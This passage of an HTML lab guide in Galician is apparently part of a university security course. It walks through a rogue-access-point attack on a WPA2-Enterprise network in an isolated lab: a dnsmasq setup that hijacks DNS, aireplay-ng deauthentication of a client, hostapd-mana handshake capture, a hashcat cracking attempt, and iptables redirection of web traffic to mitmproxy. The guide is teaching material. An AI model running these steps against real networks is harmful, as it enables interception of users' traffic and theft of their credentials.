+</span><span id="__span-9-7"><a href="#__codelineno-9-7" id="__codelineno-9-7" name="__codelineno-9-7"></a><span class="c1"># Verificar</span>
+</span><span id="__span-9-8"><a href="#__codelineno-9-8" id="__codelineno-9-8" name="__codelineno-9-8"></a>ip<span class="w"> </span>addr<span class="w"> </span>show<span class="w"> </span>wlan2
+</span><span id="__span-9-9"><a href="#__codelineno-9-9" id="__codelineno-9-9" name="__codelineno-9-9"></a><span class="c1"># Debe amosar: inet 10.0.0.1/24</span>
+</span><span id="__span-9-10"><a href="#__codelineno-9-10" id="__codelineno-9-10" name="__codelineno-9-10"></a>
+</span><span id="__span-9-11"><a href="#__codelineno-9-11" id="__codelineno-9-11" name="__codelineno-9-11"></a><span class="c1"># Configurar dnsmasq (servidor DHCP + DNS)</span>
+</span><span id="__span-9-12"><a href="#__codelineno-9-12" id="__codelineno-9-12" name="__codelineno-9-12"></a><span class="c1"># CRÍTICO: dhcp-option=6 debe apuntar ao propio MITM (10.0.0.1) como DNS,</span>
+</span><span id="__span-9-13"><a href="#__codelineno-9-13" id="__codelineno-9-13" name="__codelineno-9-13"></a><span class="c1"># non a 8.8.8.8. Se o cliente usa 8.8.8.8 directamente, dnsspoof non intercepta nada.</span>
+</span><span id="__span-9-14"><a href="#__codelineno-9-14" id="__codelineno-9-14" name="__codelineno-9-14"></a>cat<span class="w"> </span>&gt;<span class="w"> </span>/tmp/dnsmasq-mitm.conf<span class="w"> </span><span class="s">&lt;&lt;EOF</span>
+</span><span id="__span-9-15"><a href="#__codelineno-9-15" id="__codelineno-9-15" name="__codelineno-9-15"></a><span class="s">interface=wlan2</span>
+</span><span id="__span-9-16"><a href="#__codelineno-9-16" id="__codelineno-9-16" name="__codelineno-9-16"></a><span class="s">dhcp-range=10.0.0.10,10.0.0.50,12h</span>
+</span><span id="__span-9-17"><a href="#__codelineno-9-17" id="__codelineno-9-17" name="__codelineno-9-17"></a><span class="s">dhcp-option=3,10.0.0.1</span>
+</span><span id="__span-9-18"><a href="#__codelineno-9-18" id="__codelineno-9-18" name="__codelineno-9-18"></a><span class="s">dhcp-option=6,10.0.0.1</span>
+</span><span id="__span-9-19"><a href="#__codelineno-9-19" id="__codelineno-9-19" name="__codelineno-9-19"></a><span class="s"># Reenviar consultas non spoofadas ao DNS real</span>
+</span><span id="__span-9-20"><a href="#__codelineno-9-20" id="__codelineno-9-20" name="__codelineno-9-20"></a><span class="s">server=8.8.8.8</span>
+</span><span id="__span-9-21"><a href="#__codelineno-9-21" id="__codelineno-9-21" name="__codelineno-9-21"></a><span class="s">log-queries</span>
+</span><span id="__span-9-22"><a href="#__codelineno-9-22" id="__codelineno-9-22" name="__codelineno-9-22"></a><span class="s">log-dhcp</span>
+</span><span id="__span-9-23"><a href="#__codelineno-9-23" id="__codelineno-9-23" name="__codelineno-9-23"></a><span class="s">EOF</span>
+</span><span id="__span-9-24"><a href="#__codelineno-9-24" id="__codelineno-9-24" name="__codelineno-9-24"></a>
+</span><span id="__span-9-25"><a href="#__codelineno-9-25" id="__codelineno-9-25" name="__codelineno-9-25"></a><span class="c1"># Arrancar dnsmasq</span>
+</span><span id="__span-9-26"><a href="#__codelineno-9-26" id="__codelineno-9-26" name="__codelineno-9-26"></a>dnsmasq<span class="w"> </span>-C<span class="w"> </span>/tmp/dnsmasq-mitm.conf<span class="w"> </span>-d<span class="w"> </span><span class="p">&amp;</span>
+</span></code></pre></div>
+<p><strong>Saída esperada:</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a href="#__codelineno-10-1" id="__codelineno-10-1" name="__codelineno-10-1"></a>dnsmasq: started, version 2.91 cachesize 150
+</span><span id="__span-10-2"><a href="#__codelineno-10-2" id="__codelineno-10-2" name="__codelineno-10-2"></a>dnsmasq: compile time options: ...
+</span><span id="__span-10-3"><a href="#__codelineno-10-3" id="__codelineno-10-3" name="__codelineno-10-3"></a>dnsmasq-dhcp: DHCP, IP range 10.0.0.10 -- 10.0.0.50, lease time 12h
+</span><span id="__span-10-4"><a href="#__codelineno-10-4" id="__codelineno-10-4" name="__codelineno-10-4"></a>dnsmasq: reading /etc/resolv.conf
+</span><span id="__span-10-5"><a href="#__codelineno-10-5" id="__codelineno-10-5" name="__codelineno-10-5"></a>dnsmasq: using nameserver 8.8.8.8#53
+</span><span id="__span-10-6"><a href="#__codelineno-10-6" id="__codelineno-10-6" name="__codelineno-10-6"></a>dnsmasq: using nameserver 1.1.1.1#53
+</span><span id="__span-10-7"><a href="#__codelineno-10-7" id="__codelineno-10-7" name="__codelineno-10-7"></a>...
+</span></code></pre></div></p>
+<p>Agora o MITM AP está <strong>totalmente funcional</strong> con:<br/>
+- Autenticación EAP (proxy a RADIUS real)<br/>
+- Servidor DHCP (asignación automática de IPs)<br/>
+- Gateway e DNS configurados<br/>
+- NAT preparado (do wifilabctl)  </p>
+<hr/>
+<h2 id="4-desautenticacion-e-forzado-consola-4-monitor">4. Desautenticación e Forzado (Consola 4 → Monitor)</h2>
+<p>Forzamos á vítima a migrar ao noso AP (Canal 1) que ten mellor sinal.</p>
+<h3 id="41-configurar-monitor-pax-16-do-pdf">4.1. Configurar Monitor (Páx. 16 do PDF)</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a href="#__codelineno-11-1" id="__codelineno-11-1" name="__codelineno-11-1"></a><span class="c1"># Activar modo monitor en wlan3 (sen illar en namespace)</span>
+</span><span id="__span-11-2"><a href="#__codelineno-11-2" id="__codelineno-11-2" name="__codelineno-11-2"></a>sudo<span class="w"> </span>airmon-ng<span class="w"> </span>start<span class="w"> </span>wlan3
+</span></code></pre></div>
+<h3 id="42-escanear-ambos-aps">4.2. Escanear Ambos APs</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a href="#__codelineno-12-1" id="__codelineno-12-1" name="__codelineno-12-1"></a>sudo<span class="w"> </span>airodump-ng<span class="w"> </span>wlan3mon
+</span></code></pre></div>
+<p><strong>Deberías ver:</strong><br/>
+- Canal 6: <code>&lt;BSSID_wlan0&gt;</code> EMPRESA-XYZ (AP lexítimo)<br/>
+- Canal 1: <code>&lt;BSSID_wlan2&gt;</code> EMPRESA-XYZ (MITM)  </p>
+<p>Anota o <strong>BSSID do AP lexítimo</strong> (wlan0) e logo preme <code>Ctrl+C</code></p>
+<h4 id="421-escanear-soamente-o-ap-lexitimo">4.2.1 Escanear soamente o AP lexítimo</h4>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a href="#__codelineno-13-1" id="__codelineno-13-1" name="__codelineno-13-1"></a>sudo<span class="w"> </span>airodump-ng<span class="w"> </span>wlan3mon<span class="w"> </span>-c<span class="w"> </span><span class="m">6</span>
+</span></code></pre></div>
+<p>Anota a <strong>MAC do Cliente lexítimo</strong> (wlan1).</p>
+<h3 id="43-configurar-canal-e-desautenticar-pax-16-17">4.3. Configurar Canal e Desautenticar (Páx. 16-17)</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a href="#__codelineno-14-1" id="__codelineno-14-1" name="__codelineno-14-1"></a><span class="c1"># CRÍTICO: Configurar wlan3mon NO CANAL DO AP LEXÍTIMO (6)</span>
+</span><span id="__span-14-2"><a href="#__codelineno-14-2" id="__codelineno-14-2" name="__codelineno-14-2"></a>Ctrl<span class="w"> </span>+<span class="w"> </span>C
+</span><span id="__span-14-3"><a href="#__codelineno-14-3" id="__codelineno-14-3" name="__codelineno-14-3"></a>sudo<span class="w"> </span>airmon-ng<span class="w"> </span>stop<span class="w"> </span>wlan3mon
+</span><span id="__span-14-4"><a href="#__codelineno-14-4" id="__codelineno-14-4" name="__codelineno-14-4"></a>sudo<span class="w"> </span>airmon-ng<span class="w"> </span>start<span class="w"> </span>wlan3<span class="w"> </span><span class="m">6</span>
+</span><span id="__span-14-5"><a href="#__codelineno-14-5" id="__codelineno-14-5" name="__codelineno-14-5"></a>
+</span><span id="__span-14-6"><a href="#__codelineno-14-6" id="__codelineno-14-6" name="__codelineno-14-6"></a><span class="c1"># Verificar</span>
+</span><span id="__span-14-7"><a href="#__codelineno-14-7" id="__codelineno-14-7" name="__codelineno-14-7"></a>sudo<span class="w"> </span>iw<span class="w"> </span>dev<span class="w"> </span>wlan3mon<span class="w"> </span>info<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>channel
+</span><span id="__span-14-8"><a href="#__codelineno-14-8" id="__codelineno-14-8" name="__codelineno-14-8"></a><span class="c1"># Debe amosar: channel 6 (2437 MHz)</span>
+</span><span id="__span-14-9"><a href="#__codelineno-14-9" id="__codelineno-14-9" name="__codelineno-14-9"></a>
+</span><span id="__span-14-10"><a href="#__codelineno-14-10" id="__codelineno-14-10" name="__codelineno-14-10"></a><span class="c1"># Desautenticar cliente (wlan1) do AP lexítimo (wlan0)</span>
+</span><span id="__span-14-11"><a href="#__codelineno-14-11" id="__codelineno-14-11" name="__codelineno-14-11"></a><span class="c1"># Substituír &lt;BSSID_wlan0&gt; polo BSSID real anotado antes</span>
+</span><span id="__span-14-12"><a href="#__codelineno-14-12" id="__codelineno-14-12" name="__codelineno-14-12"></a>sudo<span class="w"> </span>aireplay-ng<span class="w"> </span>--deauth<span class="w"> </span><span class="m">50</span><span class="w"> </span>-a<span class="w"> </span>&lt;BSSID_wlan0&gt;<span class="w"> </span>wlan3mon
+</span></code></pre></div>
+<p><strong>Saída esperada:</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a href="#__codelineno-15-1" id="__codelineno-15-1" name="__codelineno-15-1"></a>09:30:15 Waiting for beacon frame (BSSID: XX:XX:XX:XX:XX:XX) on channel 6
+</span><span id="__span-15-2"><a href="#__codelineno-15-2" id="__codelineno-15-2" name="__codelineno-15-2"></a>09:30:15 Sending 64 directed DeAuth...
+</span><span id="__span-15-3"><a href="#__codelineno-15-3" id="__codelineno-15-3" name="__codelineno-15-3"></a>09:30:16 Sending 64 directed DeAuth...
+</span></code></pre></div></p>
+<hr/>
+<h2 id="5-verificacion-de-conexion-ao-mitm-consola-2">5. Verificación de Conexión ao MITM (Consola 2)</h2>
+<p>Comprobamos que o cliente migrou ao MITM.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a href="#__codelineno-16-1" id="__codelineno-16-1" name="__codelineno-16-1"></a><span class="c1"># Entrar no namespace do cliente</span>
+</span><span id="__span-16-2"><a href="#__codelineno-16-2" id="__codelineno-16-2" name="__codelineno-16-2"></a><span class="c1"># sudo ip netns exec wifi_cliente_wlan1 bash</span>
+</span><span id="__span-16-3"><a href="#__codelineno-16-3" id="__codelineno-16-3" name="__codelineno-16-3"></a>
+</span><span id="__span-16-4"><a href="#__codelineno-16-4" id="__codelineno-16-4" name="__codelineno-16-4"></a><span class="c1"># Verificar a que AP está conectado</span>
+</span><span id="__span-16-5"><a href="#__codelineno-16-5" id="__codelineno-16-5" name="__codelineno-16-5"></a>iw<span class="w"> </span>dev<span class="w"> </span>wlan1<span class="w"> </span>link
+</span></code></pre></div>
+<p><strong>Se conectou ao MITM (ÉXITO):</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a href="#__codelineno-17-1" id="__codelineno-17-1" name="__codelineno-17-1"></a>Connected to &lt;BSSID_wlan2&gt; (on wlan1)
+</span><span id="__span-17-2"><a href="#__codelineno-17-2" id="__codelineno-17-2" name="__codelineno-17-2"></a>SSID: EMPRESA-XYZ
+</span><span id="__span-17-3"><a href="#__codelineno-17-3" id="__codelineno-17-3" name="__codelineno-17-3"></a>freq: 2412 ← Canal 1 (MITM wlan2) ✓
+</span></code></pre></div></p>
+<p><strong>Se conectou ao lexítimo (repetir desautenticación na Consola 4):</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a href="#__codelineno-18-1" id="__codelineno-18-1" name="__codelineno-18-1"></a>Connected to &lt;BSSID_wlan0&gt; (on wlan1)
+</span><span id="__span-18-2"><a href="#__codelineno-18-2" id="__codelineno-18-2" name="__codelineno-18-2"></a>freq: 2437 ← Canal 6 (AP lexítimo wlan0)
+</span></code></pre></div></p>
+<hr/>
+<h2 id="6-captura-de-handshakes-wpa2-consola-3">6. Captura de Handshakes WPA2 (Consola 3)</h2>
+<p>Unha vez que o cliente conecta ao MITM, <code>hostapd-mana</code> captura <strong>handshakes WPA2</strong>.</p>
+<h3 id="61-visualizar-logs-pax-18-do-pdf">6.1. Visualizar Logs (Páx. 18 do PDF)</h3>
+<p>Volve á <strong>Consola 3</strong> (onde está executándose <code>hostapd-mana</code>) e verás:
+NOTA: Consideramos a MAC do cliente lexítimo: 7a:10:a4:c1:ae:3d</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a href="#__codelineno-19-1" id="__codelineno-19-1" name="__codelineno-19-1"></a>wlan2: STA 7a:10:a4:c1:ae:3d IEEE 802.11: authenticated
+</span><span id="__span-19-2"><a href="#__codelineno-19-2" id="__codelineno-19-2" name="__codelineno-19-2"></a>wlan2: STA 7a:10:a4:c1:ae:3d IEEE 802.11: associated (aid 1)
+</span><span id="__span-19-3"><a href="#__codelineno-19-3" id="__codelineno-19-3" name="__codelineno-19-3"></a>wlan2: CTRL-EVENT-EAP-STARTED 7a:10:a4:c1:ae:3d
+</span><span id="__span-19-4"><a href="#__codelineno-19-4" id="__codelineno-19-4" name="__codelineno-19-4"></a>wlan2: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
+</span><span id="__span-19-5"><a href="#__codelineno-19-5" id="__codelineno-19-5" name="__codelineno-19-5"></a>MANA: Captured a WPA/2 handshake from: 7a:10:a4:c1:ae:3d
+</span><span id="__span-19-6"><a href="#__codelineno-19-6" id="__codelineno-19-6" name="__codelineno-19-6"></a>MANA WPA2 HASHCAT | WPA*02*4cb8c817f8bee9e5bcc02b78f4d2200c*...
+</span><span id="__span-19-7"><a href="#__codelineno-19-7" id="__codelineno-19-7" name="__codelineno-19-7"></a>wlan2: STA 7a:10:a4:c1:ae:3d WPA: pairwise key handshake completed (RSN)
+</span><span id="__span-19-8"><a href="#__codelineno-19-8" id="__codelineno-19-8" name="__codelineno-19-8"></a>wlan2: AP-STA-CONNECTED 7a:10:a4:c1:ae:3d
+</span><span id="__span-19-9"><a href="#__codelineno-19-9" id="__codelineno-19-9" name="__codelineno-19-9"></a>wlan2: STA 7a:10:a4:c1:ae:3d RADIUS: starting accounting session 99D2DACFAD14AB90
+</span><span id="__span-19-10"><a href="#__codelineno-19-10" id="__codelineno-19-10" name="__codelineno-19-10"></a>wlan2: STA 7a:10:a4:c1:ae:3d IEEE 802.1X: authenticated - EAP type: 25 (PEAP)
+</span></code></pre></div>
+<hr/>
+<h2 id="7-tentativa-de-crackear-handshake-wpa2-consola-5-analise">7. Tentativa de Crackear Handshake WPA2 (Consola 5 → Análise)</h2>
+<h3 id="71-extraer-hash-wpa2-pax-18-19-do-pdf">7.1. Extraer Hash WPA2 (Páx. 18-19 do PDF)</h3>
+<p>Nunha <strong>nova terminal</strong> (Consola 5):</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a href="#__codelineno-20-1" id="__codelineno-20-1" name="__codelineno-20-1"></a><span class="c1"># Extraer o primeiro handshake dos logs</span>
+</span><span id="__span-20-2"><a href="#__codelineno-20-2" id="__codelineno-20-2" name="__codelineno-20-2"></a>grep<span class="w"> </span><span class="s2">"MANA WPA2 HASHCAT"</span><span class="w"> </span>/tmp/mana-ap.log<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-1<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span>-F<span class="s1">'|'</span><span class="w"> </span><span class="s1">'{print $2}'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span>-d<span class="w"> </span><span class="s1">' '</span><span class="w"> </span>&gt;<span class="w"> </span>/tmp/wpa2-handshake.hc22000
+</span><span id="__span-20-3"><a href="#__codelineno-20-3" id="__codelineno-20-3" name="__codelineno-20-3"></a>
+</span><span id="__span-20-4"><a href="#__codelineno-20-4" id="__codelineno-20-4" name="__codelineno-20-4"></a><span class="c1"># Verificar hash extraído</span>
+</span><span id="__span-20-5"><a href="#__codelineno-20-5" id="__codelineno-20-5" name="__codelineno-20-5"></a>cat<span class="w"> </span>/tmp/wpa2-handshake.hc22000
+</span><span id="__span-20-6"><a href="#__codelineno-20-6" id="__codelineno-20-6" name="__codelineno-20-6"></a><span class="c1"># Debe amosar: WPA*02*...</span>
+</span></code></pre></div>
+<h3 id="72-tentar-crackear-con-hashcat-modo-22000">7.2. Tentar Crackear con hashcat (<a href="../../../apuntamentos/modo-22000/" target="_blank">Modo 22000</a>)</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a href="#__codelineno-21-1" id="__codelineno-21-1" name="__codelineno-21-1"></a><span class="c1"># Descomprimir rockyou</span>
+</span><span id="__span-21-2"><a href="#__codelineno-21-2" id="__codelineno-21-2" name="__codelineno-21-2"></a>gunzip<span class="w"> </span>-c<span class="w"> </span>/usr/share/wordlists/rockyou.txt.gz<span class="w"> </span>&gt;<span class="w"> </span>/tmp/rockyou.txt
+</span><span id="__span-21-3"><a href="#__codelineno-21-3" id="__codelineno-21-3" name="__codelineno-21-3"></a>
+</span><span id="__span-21-4"><a href="#__codelineno-21-4" id="__codelineno-21-4" name="__codelineno-21-4"></a><span class="c1"># Crackear handshake WPA2-EAP</span>
+</span><span id="__span-21-5"><a href="#__codelineno-21-5" id="__codelineno-21-5" name="__codelineno-21-5"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">22000</span><span class="w"> </span>/tmp/wpa2-handshake.hc22000<span class="w"> </span>/tmp/rockyou.txt
+</span></code></pre></div>
+<p><strong>Resultado: Exhausted (NON atopa nada)</strong></p>
+<h3 id="73-conclusion-critica-pax-19-do-pdf">7.3. Conclusión Crítica (Páx. 19 do PDF)</h3>
+<div class="admonition warning">
+<p class="admonition-title"><strong>IMPORTANTE: Limitación de WPA2-EAP</strong></p>
+<p>En WPA2-EAP, o handshake WPA2 capturado <strong>NON contén a contrasinal do usuario</strong>.</p>
+<p><strong>Diferenza técnica:</strong><br/>
+- <strong>WPA2-PSK</strong>: PMK = PBKDF2(contrasinal, SSID) → <strong>Crackeable con dicionario</strong> ✓<br/>
+- <strong>WPA2-EAP</strong>: PMK = Derivada do MSK (Master Session Key) → <strong>NON crackeable con dicionario</strong> ✗  </p>
+<p>O MSK xérao o servidor RADIUS durante a autenticación EAP/PEAP e <strong>NON está relacionado directamente coa contrasinal do usuario</strong> "1234".</p>
+<p><strong>Para capturar credenciais en WPA2-EAP, necesitas:</strong><br/>
+1. Modo Evil Twin (<code>eap_server=1</code>) sen proxy → captura hash MSCHAPv2 (Práctica 2) ✓<br/>
+2. <strong>Interceptar tráfico post-autenticación</strong> (SSL Stripping, DNS Spoofing) ✓ ← Continuamos aquí  </p>
+</div>
+<hr/>
+<h2 id="8-interceptacion-de-trafico-con-mitmproxy-consola-6-namespace-mitm_wlan2">8. Interceptación de Tráfico con mitmproxy (Consola 6 → namespace mitm_wlan2)</h2>
+<p>Dado que non podemos crackear o handshake WPA2-EAP, interceptamos o tráfico HTTP/HTTPS do cliente <strong>despois de autenticarse</strong> usando <code>mitmproxy</code>.</p>
+<blockquote>
+<p><strong>Nota:</strong> <code>sslstrip</code> está obsoleto en Kali (incompatible con Python 3). Usamos <code>mitmproxy</code> como substituto moderno.</p>
+</blockquote>
+<h3 id="81-entrar-no-namespace-mitm">8.1. Entrar no Namespace MITM</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-22-1"><a href="#__codelineno-22-1" id="__codelineno-22-1" name="__codelineno-22-1"></a>sudo<span class="w"> </span>ip<span class="w"> </span>netns<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>mitm_wlan2<span class="w"> </span>bash
+</span></code></pre></div>
+<h3 id="82-instalar-mitmproxy-se-non-esta">8.2. Instalar mitmproxy (se non está)</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-23-1"><a href="#__codelineno-23-1" id="__codelineno-23-1" name="__codelineno-23-1"></a>apt<span class="w"> </span>update<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>apt<span class="w"> </span>-y<span class="w"> </span>install<span class="w"> </span>mitmproxy
+</span></code></pre></div>
+<h3 id="83-configurar-nat">8.3. Configurar <a href="https://raw.githubusercontent.com/ricardofc/repoEDU-CCbySA/main/BRS/Taller/Mecanismos-de-Control/Firewall/Layer4/1-Practica-BRS-Firewall-iptables_pageNumbers.pdf" target="_blank">NAT</a></h3>
+<p>O tráfico do cliente (10.0.0.0/24) debe saír por <code>veth0</code> → <code>br-radius</code> → Internet.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-24-1"><a href="#__codelineno-24-1" id="__codelineno-24-1" name="__codelineno-24-1"></a><span class="c1"># Verificar namespace</span>
+</span><span id="__span-24-2"><a href="#__codelineno-24-2" id="__codelineno-24-2" name="__codelineno-24-2"></a>ip<span class="w"> </span>netns<span class="w"> </span>identify
+</span><span id="__span-24-3"><a href="#__codelineno-24-3" id="__codelineno-24-3" name="__codelineno-24-3"></a><span class="c1"># Debe amosar: mitm_wlan2</span>
+</span><span id="__span-24-4"><a href="#__codelineno-24-4" id="__codelineno-24-4" name="__codelineno-24-4"></a>
+</span><span id="__span-24-5"><a href="#__codelineno-24-5" id="__codelineno-24-5" name="__codelineno-24-5"></a><span class="c1"># NAT para dar Internet ao cliente</span>
+</span><span id="__span-24-6"><a href="#__codelineno-24-6" id="__codelineno-24-6" name="__codelineno-24-6"></a>iptables<span class="w"> </span>-t<span class="w"> </span>nat<span class="w"> </span>-A<span class="w"> </span>POSTROUTING<span class="w"> </span>-s<span class="w"> </span><span class="m">10</span>.0.0.0/24<span class="w"> </span>-o<span class="w"> </span>veth0<span class="w"> </span>-j<span class="w"> </span>MASQUERADE
+</span><span id="__span-24-7"><a href="#__codelineno-24-7" id="__codelineno-24-7" name="__codelineno-24-7"></a>
+</span><span id="__span-24-8"><a href="#__codelineno-24-8" id="__codelineno-24-8" name="__codelineno-24-8"></a><span class="c1"># Verificar</span>
+</span><span id="__span-24-9"><a href="#__codelineno-24-9" id="__codelineno-24-9" name="__codelineno-24-9"></a>iptables<span class="w"> </span>-t<span class="w"> </span>nat<span class="w"> </span>-L<span class="w"> </span>POSTROUTING<span class="w"> </span>-n<span class="w"> </span>-v
+</span></code></pre></div>
+<h3 id="84-configurar-dns">8.4. Configurar DNS</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-25-1"><a href="#__codelineno-25-1" id="__codelineno-25-1" name="__codelineno-25-1"></a><span class="c1"># Comprobar configuración servidores DNS</span>
+</span><span id="__span-25-2"><a href="#__codelineno-25-2" id="__codelineno-25-2" name="__codelineno-25-2"></a>cat<span class="w"> </span>/etc/resolv.conf
+</span><span id="__span-25-3"><a href="#__codelineno-25-3" id="__codelineno-25-3" name="__codelineno-25-3"></a><span class="w">  </span>nameserver<span class="w"> </span><span class="m">8</span>.8.8.8
+</span><span id="__span-25-4"><a href="#__codelineno-25-4" id="__codelineno-25-4" name="__codelineno-25-4"></a><span class="w">  </span>nameserver<span class="w"> </span><span class="m">1</span>.1.1.1
+</span><span id="__span-25-5"><a href="#__codelineno-25-5" id="__codelineno-25-5" name="__codelineno-25-5"></a>
+</span><span id="__span-25-6"><a href="#__codelineno-25-6" id="__codelineno-25-6" name="__codelineno-25-6"></a><span class="c1">#No caso que non aparezan eses servidores DNS, executar:</span>
+</span><span id="__span-25-7"><a href="#__codelineno-25-7" id="__codelineno-25-7" name="__codelineno-25-7"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">"nameserver 8.8.8.8"</span><span class="w"> </span>&gt;<span class="w"> </span>/etc/resolv.conf
+</span><span id="__span-25-8"><a href="#__codelineno-25-8" id="__codelineno-25-8" name="__codelineno-25-8"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">"nameserver 1.1.1.1"</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/resolv.conf
+</span></code></pre></div>
+<h3 id="85-verificar-conectividade">8.5. Verificar Conectividade</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-26-1"><a href="#__codelineno-26-1" id="__codelineno-26-1" name="__codelineno-26-1"></a>ping<span class="w"> </span>-c<span class="w"> </span><span class="m">2</span><span class="w"> </span><span class="m">8</span>.8.8.8
+</span><span id="__span-26-2"><a href="#__codelineno-26-2" id="__codelineno-26-2" name="__codelineno-26-2"></a><span class="c1"># Debe funcionar ✓</span>
+</span></code></pre></div>
+<p><strong>Se NON funciona,</strong> volve á Consola 1 e verifica o NAT no bridge:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-27-1"><a href="#__codelineno-27-1" id="__codelineno-27-1" name="__codelineno-27-1"></a>sudo<span class="w"> </span>iptables<span class="w"> </span>-t<span class="w"> </span>nat<span class="w"> </span>-A<span class="w"> </span>POSTROUTING<span class="w"> </span>-s<span class="w"> </span><span class="m">192</span>.168.50.0/24<span class="w"> </span>-o<span class="w"> </span>eth0<span class="w"> </span>-j<span class="w"> </span>MASQUERADE
+</span></code></pre></div></p>
+<h3 id="86-redirixir-portos-http-e-https-a-mitmproxy">8.6. Redirixir Portos HTTP e HTTPS a mitmproxy</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-28-1"><a href="#__codelineno-28-1" id="__codelineno-28-1" name="__codelineno-28-1"></a><span class="c1"># Redirixir HTTP (80) e HTTPS (443) ao proxy (8080)</span>
+</span><span id="__span-28-2"><a href="#__codelineno-28-2" id="__codelineno-28-2" name="__codelineno-28-2"></a>iptables<span class="w"> </span>-t<span class="w"> </span>nat<span class="w"> </span>-A<span class="w"> </span>PREROUTING<span class="w"> </span>-i<span class="w"> </span>wlan2<span class="w"> </span>-p<span class="w"> </span>tcp<span class="w"> </span>--dport<span class="w"> </span><span class="m">80</span><span class="w">  </span>-j<span class="w"> </span>REDIRECT<span class="w"> </span>--to-port<span class="w"> </span><span class="m">8080</span>
+</span><span id="__span-28-3"><a href="#__codelineno-28-3" id="__codelineno-28-3" name="__codelineno-28-3"></a>iptables<span class="w"> </span>-t<span class="w"> </span>nat<span class="w"> </span>-A<span class="w"> </span>PREROUTING<span class="w"> </span>-i<span class="w"> </span>wlan2<span class="w"> </span>-p<span class="w"> </span>tcp<span class="w"> </span>--dport<span class="w"> </span><span class="m">443</span><span class="w"> </span>-j<span class="w"> </span>REDIRECT<span class="w"> </span>--to-port<span class="w"> </span><span class="m">8080</span>
+</span><span id="__span-28-4"><a href="#__codelineno-28-4" id="__codelineno-28-4" name="__codelineno-28-4"></a>
+</span><span id="__span-28-5"><a href="#__codelineno-28-5" id="__codelineno-28-5" name="__codelineno-28-5"></a><span class="c1"># Verificar</span>
+</span><span id="__span-28-6"><a href="#__codelineno-28-6" id="__codelineno-28-6" name="__codelineno-28-6"></a>iptables<span class="w"> </span>-t<span class="w"> </span>nat<span class="w"> </span>-L<span class="w"> </span>PREROUTING<span class="w"> </span>-n<span class="w"> </span>-v<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="m">8080</span>
+</span></code></pre></div>
+<h3 id="87-executar-mitmproxy">8.7. Executar mitmproxy</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-29-1"><a href="#__codelineno-29-1" id="__codelineno-29-1" name="__codelineno-29-1"></a><span class="c1"># Arrancar mitmproxy en modo transparente, gardando flows en /tmp</span>
+</span><span id="__span-29-2"><a href="#__codelineno-29-2" id="__codelineno-29-2" name="__codelineno-29-2"></a>mitmproxy<span class="w"> </span>--mode<span class="w"> </span>transparent<span class="w"> </span>--showhost<span class="w"> </span>-w<span class="w"> </span>/tmp/mitm-capture.flow
+</span></code></pre></div>
+<p><strong>Saída esperada:</strong>
+<img alt="Fig. Execución mitmproxy" src="../images/mitmproxy-1.png"/></p>
+<p><strong>Deixa isto executándose na Consola 6.</strong></p>
+<blockquote>
+<p><strong>Nota técnica:</strong> <code>-w</code> garda os flows capturados no ficheiro <code>/tmp/mitm-capture.flow</code>. Este ficheiro é accesible desde calquera namespace porque <code>ip netns</code> só illa a rede, non o sistema de ficheiros.</p>
+</blockquote>
+<hr/>
+<h2 id="9-punto-de-decision-continuar-ao-ataque-mitm-consolas-3-4-e-6">9. PUNTO DE DECISIÓN: Continuar ao ataque MITM (Consolas 3, 4 e 6)</h2>
+<p><strong>Agora continuamos a:</strong><br/>
+- <strong>Consola 3</strong>: Configurar hostapd-mana (AP Rogue no Canal 1)<br/>
+- <strong>Consola 4</strong>: Desautenticar ao cliente para forzar migración ao MITM<br/>
+- <strong>Consola 6</strong>: Configurar mitmproxy para interceptar tráfico  </p>
+<hr/>
+<h2 id="91-despois-de-desautenticacion-renovar-ip-do-mitm">9.1. DESPOIS de Desautenticación: Renovar IP do MITM</h2>
+<div class="admonition warning">
+<p class="admonition-title"><strong>Esta sección só se aplica DESPOIS de:</strong></p>
+<ol>
+<li>Executar <strong>hostapd-mana</strong> na Consola 3 (AP Rogue no Canal 1)  </li>
+<li>Executar <strong>aireplay-ng</strong> na Consola 4 (desautenticación)  </li>
+<li>Confirmar que o cliente <strong>migrou ao MITM</strong> </li>
+</ol>
+</div>
+<hr/>
+<h3 id="911-verificar-migracion-ao-mitm">9.1.1. Verificar Migración ao MITM</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-30-1"><a href="#__codelineno-30-1" id="__codelineno-30-1" name="__codelineno-30-1"></a><span class="c1"># Verificar a que AP está conectado AGORA  </span>
